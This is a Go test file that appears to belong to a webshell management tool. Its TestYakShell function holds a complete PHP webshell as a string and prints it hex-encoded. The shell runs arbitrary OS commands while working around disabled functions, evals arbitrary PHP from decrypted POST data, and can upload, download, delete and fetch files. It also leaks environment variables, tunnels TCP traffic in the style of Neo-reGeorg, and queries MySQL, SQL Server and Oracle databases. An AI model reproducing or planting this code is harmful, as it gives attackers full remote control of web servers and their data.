package wsm

import (
	"encoding/hex"
	"fmt"
	"testing"
)

func TestYakShell(t *testing.T) {
	code := `%v
function ping(){
    return array("status"=>"ok","data"=>base64_encode("ok"));
}
function baseinfo()
{
    $driveList = "";
    if (stristr(PHP_OS, "windows") || stristr(PHP_OS, "winnt")) {
        for ($i = 65; $i <= 90; $i++) {
            $drive = chr($i) . ':/';
            file_exists($drive) ? $driveList = $driveList . $drive . ";" : '';
        }
    } else {
        $driveList = "/";
    }
    $res = array();
    $R = array();
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") $D = dirname($_SERVER["PATH_TRANSLATED"]);
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R["drive"] = $driveList;
    $R["os_version"] = php_uname();
    $R["current_user"] = "{$s}";
    $envString = "";
    foreach ($_ENV as $variableName => $variableValue) {
        $envString .= "{$variableName}={$variableValue}\n";
    }
    $R["os_env"] = $envString;
    $R["pwd"] = __DIR__;
    $res["status"] = "ok";
    $res["data"] = base64_encode(json_encode($R));
    return json_encode($res);
}

function mkdirall($path)
{
    $res = array();
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");;
    $path = base64_decode($path);
    if (file_exists($path)) {
        $res["data"] = base64_encode("dir has exits");
    } else {
        if (!mkdir($path)) {
            $res["data"] = base64_encode("mkdir error");
        } else {
            $res["status"] = "ok";
            $res["data"] = base64_encode("mkdir success");
        }
    }
    return json_encode($res);
}

function chmodpermission($file, $permission)
{
    $file = base64_decode($file);
    $res = array();
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");;
    if (chmod($file, $permission)) {
        $res["status"] = "ok";
        $res["data"] = base64_encode("chmod premission success");
    }
    return json_encode($res);
}

function chmodfiletime($file, $accessTime, $modifyTime)
{
    $file = base64_decode($file);
    date_default_timezone_set('UTC');
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");;
    if (!file_exists($file)) {
        $res["data"] = base64_encode("file not found");
        return json_encode($res);
    }

    if (touch($file, $accessTime, $modifyTime)) {
        $res["status"] = "ok";
        $res["data"] = base64_encode("chmod file time success");
        return json_encode($res);
    } else {
        return json_encode($res);
    }
}

function getSafeStr($str)
{
    $s1 = iconv('utf-8', 'gbk//IGNORE', $str);
    $s0 = iconv('gbk', 'utf-8//IGNORE', $s1);
    if ($s0 == $str) {
        return $s0;
    } else {
        return iconv('gbk', 'utf-8//IGNORE', $str);
    }
}

function cmdinfo($c)
{
    @set_time_limit(0);
    @ignore_user_abort(1);
    @ini_set('max_execution_time', 0);
    $result = array();
    $PadtJn = @ini_get('disable_functions');
    if (!empty($PadtJn)) {
        $PadtJn = preg_replace('/[, ]+/', ',', $PadtJn);
        $PadtJn = explode(',', $PadtJn);
        $PadtJn = array_map('trim', $PadtJn);
    } else {
        $PadtJn = array();
    }
    if (FALSE !== strpos(strtolower(PHP_OS), 'win')) {
        @putenv("PATH=" . getenv("PATH") . ";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;");
        $c = $c . " 2>&1\n";
    } else {
        @putenv("PATH=" . getenv("PATH") . ":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    }
    $JueQDBH = 'is_callable';
    $Bvce = 'in_array';
    if ($JueQDBH('system') and !$Bvce('system', $PadtJn)) {
        ob_start();
        system($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('proc_open') and !$Bvce('proc_open', $PadtJn)) {
        $handle = proc_open($c, array(
            array(
                'pipe',
                'r'
            ),
            array(
                'pipe',
                'w'
            ),
            array(
                'pipe',
                'w'
            )
        ), $pipes);
        $kWJW = NULL;
        while (!feof($pipes[1])) {
            $kWJW .= fread($pipes[1], 1024);
        }
        @proc_close($handle);
    } else if ($JueQDBH('passthru') and !$Bvce('passthru', $PadtJn)) {
        ob_start();
        passthru($c);
        $kWJW = ob_get_contents();
        ob_end_clean();
    } else if ($JueQDBH('shell_exec') and !$Bvce('shell_exec', $PadtJn)) {
        $kWJW = shell_exec($c);
    } else if ($JueQDBH('exec') and !$Bvce('exec', $PadtJn)) {
        $kWJW = array();
        exec($c, $kWJW);
        $kWJW = join(chr(10), $kWJW) . chr(10);
    } else if ($JueQDBH('exec') and !$Bvce('popen', $PadtJn)) {
        $fp = popen($c, 'r');
        $kWJW = NULL;
        if (is_resource($fp)) {
            while (!feof($fp)) {
                $kWJW .= fread($fp, 1024);
            }
        }
        @pclose($fp);
    } else {
        $kWJW = 0;
        $result["status"] = "fail";
        $result["data"] = base64_encode("exec error");
        return json_encode($result);
    }
    $result["status"] = "ok";
    $result["data"] = base64_encode(getSafeStr($kWJW));
    return json_encode($result);
}

function xcopy($src, $dest)
{
    $src = base64_decode($src);
    $dest = base64_decode($dest);
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");
    if (is_file($src)) {
        if (!copy($src, $dest)) {
            return json_encode($res);
        } else {
            $res["status"] = "ok";
            $res["data"] = base64_encode("copy success");
            return json_encode($res);
        }
    }
    $m = @dir($src);
    if (!is_dir($dest)) if (!@mkdir($dest)) return false;
    while ($f = $m->read()) {
        $isrc = $src . chr(47) . $f;
        $idest = $dest . chr(47) . $f;
        if ((is_dir($isrc)) && ($f != chr(46)) && ($f != chr(46) . chr(46))) {
            if (!xcopy($isrc, $idest)) {
                return json_encode($res);
            }
        } else if (is_file($isrc)) {
            if (!copy($isrc, $idest)) {
                return json_encode($res);
            }
        }
    }
    $res["status"] = "ok";
    $res["data"] = base64_encode("copy success");
    return json_encode($res);
}

function createfile($filename, $content)
{
    $filename = base64_decode($filename);
    $content = base64_decode($content);
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");
    if (file_exists($filename)) {
        $res["data"] = base64_encode("file exits");
        return json_encode($res);
    }
    if (file_put_contents($filename, $content)) {
        $res["status"] = "ok";
        $res["data"] = base64_encode("create file success");
    }
    return json_encode($res);
}

function deletefile($p)
{
    $p = base64_decode($p);
    $res = array();
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");
    if (!file_exists($p)) {
        $res["data"] = base64_encode("file or dir not found");
        return json_encode($res);
    }
    if (is_file($p)) {
        if (unlink($p)) {
            $res["data"] = base64_encode("delete success");
        } else {
            $res["data"] = base64_encode("delete fail");
        }
        return json_encode($res);
    }
    if (rmdir($p)) {
        $res["status"] = "ok";
        $res["data"] = base64_encode("delete success");
    } else {
        $res["data"] = base64_encode("delete fail");
    }
    return json_encode($res);
}

function dirinfo($folderPath)
{
    $folderPath = base64_decode($folderPath);
    $res["status"] = "fail";;
    $res["data"] = base64_encode("premission defined");
    if (!is_dir($folderPath)) {
        $res["data"] = base64_encode("no dir");
        return json_encode($res);
    }
    $files = scandir($folderPath);
    $result = [];
    foreach ($files as $file) {
        if ($file === '.' || $file === '..') {
            continue;
        }
        $filePath = $folderPath . DIRECTORY_SEPARATOR . $file;
        $a = is_readable($filePath) ? "r" : "-";
        $b = is_writable($filePath) ? "w" : "-";
        $c = is_executable($filePath) ? "x" : "-";
        $fileInfo = [
            'filename' => $file,
            'time' => date('Y-m-d H:i:s', filemtime($filePath)),
            'size' => (string)filesize($filePath),
            'type' => is_dir($filePath) ? "dir" : "file",
            'current_user_permissions' => $a . $b . $c,
            'content' => ""
        ];
        $result[] = $fileInfo;
    }

    $data = json_encode($result, JSON_PRETTY_PRINT);
    $res["status"] = "ok";
    $res["data"] = base64_encode($data);
    return json_encode($res);
}

function downloadfile($filename, $start, $len, $fileEof)
{
    $filename = base64_decode($filename);
    $res = array();
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");
    if (file_exists($filename)) {
        $size = filesize($filename);
        $readLen = 0;
        $stopFlag = false;
        if ((intval($start) + intval($len)) >= $size) {
            $readLen = $size - intval($start);
            $stopFlag = true;
        } else {
            $readLen = $len;
        }
        $a = file_get_contents($filename, false, null, $start, $len);
        if ($a) {
            $res["status"] = "ok";
            if ($stopFlag) {
                $res["data"] = base64_encode(base64_encode($a) . $fileEof);
                return json_encode($res);
            } else {
                $res["data"] = base64_encode(base64_encode($a));
                return json_encode($res);
            }
        } else {
            return json_encode($res);
        }
    } else {
        $res["data"] = base64_encode("target file not found");
        return json_encode($res);
    }
}

function renamefile($oldFile, $newFile)
{
    $oldFile = base64_decode($oldFile);
    $newFile = base64_decode($newFile);
    $res = array();
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");
    if (!file_exists($oldFile)) {
        $res["data"] = base64_encode("file not found");
        return json_encode($res);
    }
    if (rename($oldFile, $newFile)) {
        $res["status"] = "ok";
        $res["data"] = base64_encode("chmod success");
        return json_encode($res);
    } else {
        $res["data"] = base64_encode("chmod fail");
        return json_encode($res);
    }
}

function uploadFile($filename, $content)
{
    $filename = base64_decode($filename);
    $content = base64_decode($content);
    $res = array();
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");
    if (file_put_contents($filename, $content, FILE_APPEND)) {
        $res["status"] = "ok";
        $res["data"] = base64_encode("upload file success");
        return json_encode($res);
    } else {
        $res["data"] = base64_encode("upload file error");
        return json_encode($res);
    }
}

function wgetfile($url, $destion)
{
    $url = base64_decode($url);
    $destion = base64_decode($destion);
    $res = array();
    $res["status"] = "fail";
    $res["data"] = base64_encode("premission defined");
    $filecontent = file_get_contents($url);
    if (!$filecontent) {
        $res["data"] = base64_encode("load remote url fail");
        return json_encode($res);
    }
    if (!file_put_contents($destion, $filecontent)) {
        $res["data"] = base64_encode("file write error");
        return json_encode($res);
    }
    $res["status"] = "ok";
    $res["data"] = base64_encode("wget file success");
    return json_encode($res);
}

function neoregorg($arg)
{
    list($cmd, $connecttarget, $block, $data) = explode("~", $arg);
    $mark = substr($cmd, 0, 18);
    $cmd = substr($cmd, 18);
    $run = "run" . $mark;
    $writebuf = "writebuf" . $mark;
    $readbuf = "readbuf" . $mark;
    $status = "Mhzufu";
    $error = "Jbbhd";
    $fail = "Jwnc";
    $sayhello = "Ehdwalvbqbvrggnrq0cdfbuxww9vx";
    $connectfail = "Jwncdvvwe1zbdahxvucpwgzcqq4";
    $ok = "Li";
    $postfail = "Ms1mnrbavkrbbxvgfkedvqv";
    switch ($cmd) {
        case "CONNECT":
            {
                $target_ary = explode("|", $connecttarget);
                $target = $target_ary[0];
                $port = (int)$target_ary[1];
                $res = fsockopen($target, $port, $errno, $errstr, 1);
                if ($res === false) {
                    header($status . ":" . $fail);
                    header($error . ":" . $connectfail);
                    return;
                }

                stream_set_blocking($res, false);
                ignore_user_abort();

                @session_start();
                $_SESSION[$run] = true;
                $_SESSION[$writebuf] = "";
                $_SESSION[$readbuf] = "";
                session_write_close();

                while ($_SESSION[$run]) {
                    if (empty($_SESSION[$writebuf])) {
                        usleep(50000);
                    }
                    $readBuff = "";
                    @session_start();
                    $writeBuff = $_SESSION[$writebuf];
                    $_SESSION[$writebuf] = "";
                    session_write_close();
                    if ($writeBuff != "") {
                        stream_set_blocking($res, false);
                        $i = fwrite($res, $writeBuff);
                        if ($i === false) {
                            @session_start();
                            $_SESSION[$run] = false;
                            session_write_close();
                            return;
                        }
                    }
                    stream_set_blocking($res, false);
                    while ($o = fgets($res, $block)) {
                        if ($o === false) {
                            @session_start();
                            $_SESSION[$run] = false;
                            session_write_close();
                            return;
                        }
                        $readBuff .= $o;
                    }
                    if ($readBuff != "") {
                        @session_start();
                        $_SESSION[$readbuf] .= $readBuff;
                        session_write_close();
                    }
                }
                fclose($res);
            }
            @header_remove('set-cookie');
            break;
        case "DISCONNECT":
            {
                @session_start();
                unset($_SESSION[$run]);
                unset($_SESSION[$readbuf]);
                unset($_SESSION[$writebuf]);
                session_write_close();
            }
            break;
        case "READ":
            {
                @session_start();
                $readBuffer = $_SESSION[$readbuf];
                $_SESSION[$readbuf] = "";
                $running = $_SESSION[$run];
                session_write_close();
                if ($running) {
                    header($status . ":" . $ok);
                    header("Connection: Keep-Alive");
                    echo base64_encode($readBuffer);
                } else {
                    header($status . ":" . $fail);
                }
            }
            break;
        case "FORWARD":
            {
                @session_start();
                $running = $_SESSION[$run];
                session_write_close();
                if (!$running) {
                    header($status . ":" . $fail);
                    return;
                }
                $rawPostData = $data;
                if ($rawPostData) {
                    @session_start();
                    $_SESSION[$writebuf] .= base64_decode($rawPostData);
                    session_write_close();
                    header($status . ":" . $ok);
                    header("Connection: Keep-Alive");
                } else {
                    header($status . ":" . $fail);
                    header($error . ":" . $postfail);
                }
            }
            break;
        default:
        {
            @session_start();
            session_write_close();
            exit($sayhello);
        }
    }
}

function evilcode($code)
{
    $res = array();
    ob_start();
    eval($code);
    $a = ob_get_clean();
    $res["status"]="ok";
    $res["data"]=base64_encode($a);
    return $res;
}

function DbExec($type, $host, $port, $user, $pass, $database, $sql)
{
    $user = base64_decode($user);
    $pass = base64_decode($pass);
    $sql = base64_decode($sql);
    $resultObj = array("status" => "fail", "data" => base64_encode("not driver"));
    $data = array();
    $array2 = array();
    if ($type == "mysql") {
        if (function_exists("mysqli_connect")) {
            $conn = mysqli_connect($host, $user, $pass, $database, $port);
            if ($conn) {
                $result = mysqli_query($conn, $sql);
                $arr = array();
                $fieldinfo = mysqli_fetch_fields($result);
                for ($i = 0; $i < sizeof($fieldinfo); $i++) {
                    array_push($arr, array("name" => $fieldinfo[$i]->name));
                }
                array_push($data, $arr);
                while ($row = mysqli_fetch_row($result)) {
                    array_push($data, $row);
                }
                mysqli_close($conn);

                $resultObj["status"] = "ok";
                $resultObj["data"] = base64_encode(json_encode($data));
            } else {
                $resultObj["status"] = "fail";
                $resultObj["data"] = base64_encode(mysqli_connect_error());
            }
        }
    } else if ($type == "sqlserver") {
        if (function_exists("odbc_connect")) {
            $connstr = "Driver={SQL Server};Server=$host,$port;Database=$database";
            $link = odbc_connect($connstr, $user, $pass, SQL_CUR_USE_ODBC);
            if ($link) {
                $SQL_Exec_String = $sql;

                $result = odbc_exec($link, $SQL_Exec_String);

                $arr = array();
                $colNums = odbc_num_fields($result);
                $fieldinfo = array();
                for ($i = 1; $i <= $colNums; $i++)
                    array_push($fieldinfo, array(
                        "name" => odbc_field_name($result, $i)
                    ));
                array_push($arr, $fieldinfo);

                while (odbc_fetch_row($result)) {

                    $record = array();
                    for ($i = 1; $i <= $colNums; $i++)
                        array_push($record, odbc_result($result, $i));
                    array_push($arr, $record);
                }
                $resultObj["status"] = "ok";
                $resultObj["data"] = base64_encode(json_encode($arr));
            } else {
                $resultObj["status"] = "fail";
                $resultObj["data"] = base64_encode("Couldn't connect to SQL Server");
            }
        } else if (function_exists("sqlsrv_connect")) {
            $arr = array();
            $Server = $host . "," . $port;
            $conInfo = array(
                'Database' => $database,
                'UID' => $user,
                'PWD' => $pass
            );
            $conn = sqlsrv_connect($Server, $conInfo);

            if ($conn) {
                $stmt = sqlsrv_query($conn, $sql);
                $fieldinfo = array();

                foreach (sqlsrv_field_metadata($stmt) as $fieldMetadata) {
                    array_push($fieldinfo, $fieldMetadata["Name"]);
                }
                array_push($arr, $fieldinfo);
                while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_NUMERIC)) {

                    $record = array();
                    for ($i = 0; $i < count($fieldinfo); $i++) {
                        $type = gettype($row[$i]);
                        if ($type == "object") {
                            $type = strtolower(get_class($row[$i]));
                            if (strstr($type, "date")) {
                                array_push($record, $row[$i]->format('Y-m-d H:i:s'));
                            }
                        } else {
                            array_push($record, $row[$i]);
                        }
                    }

                    array_push($arr, $record);
                }
                sqlsrv_close($conn);
                $resultObj["status"] = "ok";
                $resultObj["data"] = base64_encode(json_encode($arr));
            } else {
                $resultObj["status"] = "fail";
                $resultObj["data"] = base64_encode("unknown error");
                if (($errors = sqlsrv_errors()) != null) {
                    foreach ($errors as $error) {
                        $resultObj["data"] = base64_encode($resultObj["error"] . $error['message']);
                    }
                }
            }
        } else {
            $resultObj["status"] = "fail";
            $resultObj["data"] = base64_encode("No SQLServer Driver.");
        }
    } else if ($type == "oracle") {
        if (function_exists("oci_connect")) {
            $db_host_name = sprintf("(DESCRIPTION=(ADDRESS=(PROTOCOL =TCP)(HOST=%s)(PORT = %s))(CONNECT_DATA =(SID=%s)))", $host, $port, $database);

            $conn = oci_connect($user, $pass, $db_host_name);
            if ($conn) {
                $stmt = oci_parse($conn, $sql);
                if ($stmt) {
                    $row_count = oci_execute($stmt);

                    $arr = array();
                    $fieldinfo = array();
                    $ncols = oci_num_fields($stmt);

                    for ($i = 1; $i <= $ncols; $i++) {
                        $column_name = oci_field_name($stmt, $i);
                        array_push($fieldinfo, array(
                            "name" => $column_name
                        ));
                    }
                    array_push($arr, $fieldinfo);

                    $count = 0;
                    while ($row = oci_fetch_row($stmt)) {
                        array_push($arr, $row);
                    }
                    $resultObj["status"] = "ok";
                    $resultObj["data"] = base64_encode(json_encode($arr));
                } else {
                    $resultObj["status"] = "fail";
                    $resultObj["data"] = base64_encode(oci_error());
                }
            } else {
                $resultObj["status"] = "fail";
                $resultObj["data"] = base64_encode(oci_error());
            }
        } else {
            $resultObj["status"] = "fail";
            $resultObj["data"] = base64_encode("No Oracle Driver.");
        }
    }
    return json_encode($resultObj);
}

echo encrypt(eval(decrypt($_POST[$pass],$pass)));`
	toString := hex.EncodeToString([]byte(code))
	fmt.Println(toString)
}
